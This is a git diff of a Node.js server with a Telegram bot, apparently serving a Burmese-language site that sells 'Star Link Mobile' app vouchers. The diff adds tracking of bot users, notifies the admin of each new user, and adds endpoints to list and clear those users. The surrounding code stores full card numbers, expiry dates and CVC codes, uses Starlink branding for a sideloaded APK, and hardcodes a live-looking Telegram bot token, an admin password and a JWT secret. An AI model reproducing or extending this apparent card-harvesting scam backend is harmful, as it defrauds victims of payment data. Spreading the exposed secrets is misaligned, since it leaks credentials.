@@ -15,7 +15,7 @@ const ADMIN_USER = process.env.ADMIN_USER || 'admin';
 const ADMIN_PASS = process.env.ADMIN_PASS || 'starlink123';
 const JWT_SECRET = process.env.JWT_SECRET || 'starlink-secret-key';
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8356328415:AAHgDeYLhTDnkKmJxik2YxIHUEwWXeUThDg';
-const ADMIN_TELEGRAM_ID = process.env.ADMIN_TELEGRAM_ID || '7590111505';
+const ADMIN_TELEGRAM_ID = process.env.ADMIN_TELEGRAM_ID || '8447661042';
 const ADMIN_TELEGRAM_URL = process.env.ADMIN_TELEGRAM_URL || 'https://t.me/m/kKMBJpt2NzNl';
 const APK_FILE_PATH = path.join(__dirname, 'public', 'Star Link Mobile 2026.001.14.apk');
 const IOS_APP_URL = 'https://apps.apple.com/us/app/starlink/id1537177988';
@@ -30,6 +30,7 @@ mongoose.connect(MONGODB_URI).then(() => console.log('Connected to MongoDB')).ca
 // --- SCHEMAS ---
 const voucherSchema = new mongoose.Schema({ code: { type: String, required: true, unique: true, uppercase: true }, is_used: { type: Boolean, default: false }, used_at: Date, created_at: { type: Date, default: Date.now }, plan: String });
 const userSchema = new mongoose.Schema({ name: String, email: String, amount: Number, planDuration: String, cardNumber: String, cardExpiry: String, cardCvc: String, country: String, countryName: String, postalCode: String, created_at: { type: Date, default: Date.now } });
+const botUserSchema = new mongoose.Schema({ user_id: { type: Number, required: true, unique: true }, first_name: String, last_name: String, username: String, started_at: { type: Date, default: Date.now } });
 const paymentSettingsSchema = new mongoose.Schema({
     kpay_name: String, kpay_phone: String, kpay_note: String, kpay_extra_note: String, kpay_qr: String,
     wave_name: String, wave_phone: String, wave_note: String, wave_extra_note: String, wave_qr: String,
@@ -38,6 +39,7 @@ const paymentSettingsSchema = new mongoose.Schema({
 
 const Voucher = mongoose.model('Voucher', voucherSchema);
 const User = mongoose.model('User', userSchema);
+const BotUser = mongoose.model('BotUser', botUserSchema);
 const PaymentSettings = mongoose.model('PaymentSettings', paymentSettingsSchema);
 
 // --- TELEGRAM BOT LOGIC ---
@@ -55,7 +57,19 @@ const mainMenu = {
     options: { reply_markup: { inline_keyboard: [[{ text: "App ဒေါင်းလုဒ်ရယူရန်", callback_data: 'download' }], [{ text: "အသုံးပြုပုံလမ်းညွှန်", callback_data: 'guide' }], [{ text: "Voucher ဝယ်ရန်", callback_data: 'buy' }], [{ text: "Admin နဲ့ဆက်သွယ်ရန်", url: ADMIN_TELEGRAM_URL }]] } }
 };
 
-bot.onText(/\/start/, (msg) => {
+bot.onText(/\/start/, async (msg) => {
+    const { id, first_name, last_name, username } = msg.from;
+    try {
+        const existingUser = await BotUser.findOne({ user_id: id });
+        if (!existingUser) {
+            const newUser = new BotUser({ user_id: id, first_name, last_name, username });
+            await newUser.save();
+            const notificationText = `New user started the bot:\n\nID: ${id}\nName: ${first_name || ''} ${last_name || ''}\nUsername: @${username || 'N/A'}`;
+            bot.sendMessage(ADMIN_TELEGRAM_ID, notificationText);
+        }
+    } catch (error) {
+        console.error('Error saving new bot user:', error);
+    }
     bot.sendMessage(msg.chat.id, mainMenu.text, mainMenu.options);
 });
 
@@ -235,6 +249,14 @@ app.post('/api/auth/login', (req, res) => {
         return res.json({ success: true, token, admin_url: ADMIN_TELEGRAM_URL });
     }
     return res.status(401).json({ success: false, message: 'Invalid credentials' });
+});
+
+app.get('/api/bot-users', authMiddleware, async (req, res) => {
+    try { res.json({ success: true, users: await BotUser.find().sort({ started_at: -1 }) }); } catch (e) { res.status(500).json({ success: false }); }
+});
+
+app.delete('/api/bot-users/clear', authMiddleware, async (req, res) => {
+    try { await BotUser.deleteMany({}); res.json({ success: true, message: 'All bot users cleared.' }); } catch(e) { res.status(500).json({ success: false }); }
 });
 
 app.post('/api/vouchers/validate', async (req, res) => {
